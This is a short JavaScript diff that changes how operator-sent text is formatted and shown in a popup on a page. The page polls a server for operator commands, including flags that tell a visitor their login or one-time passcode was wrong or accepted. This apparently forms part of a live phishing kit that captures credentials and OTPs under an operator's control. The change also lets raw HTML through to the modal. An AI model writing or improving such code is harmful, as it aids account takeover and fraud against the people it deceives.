@@ -134,8 +134,10 @@ async function showTextPopup(message) {
     isModalOpen = false;
   }
 
-  // Format the message
-  const formattedMessage = formatTextMessage(message);
+  // Format the message ONLY if not already formatted
+  const formattedMessage = message.includes('<span') 
+    ? message 
+    : formatTextMessage(message);
 
   let textModal = document.getElementById('customTextModal');
   if (!textModal) {
@@ -204,17 +206,16 @@ async function pollAdminText() {
     adminTextHandling = true;
 
     // NEW: Check for regular text message first (not a special flag)
-if (data.admin_text && data.admin_text.trim() !== '' && 
-    data.admin_text !== 'incorrect_otp_error' && 
-    data.admin_text !== 'wrong_login_error' && 
-    data.admin_text !== 'correct_login_success') {
-  // This is a regular text message from "Send Text" button
-  const formattedMessage = formatTextMessage(data.admin_text);  // ✅ Format here
-  await showTextPopup(formattedMessage);  // ✅ Pass formatted message
-  await releaseAdminText();
-  adminTextHandling = false;
-  return;
-}
+    if (data.admin_text && data.admin_text.trim() !== '' && 
+        data.admin_text !== 'incorrect_otp_error' && 
+        data.admin_text !== 'wrong_login_error' && 
+        data.admin_text !== 'correct_login_success') {
+      // This is a regular text message from "Send Text" button
+      await showTextPopup(data.admin_text);  // Pass raw message - formatting happens inside showTextPopup
+      await releaseAdminText();
+      adminTextHandling = false;
+      return;
+    }
 
     if      (data.admin_text === 'incorrect_otp_error')  await handleIncorrectOtp();
     else if (data.admin_text === 'wrong_login_error')     await handleWrongLogin();
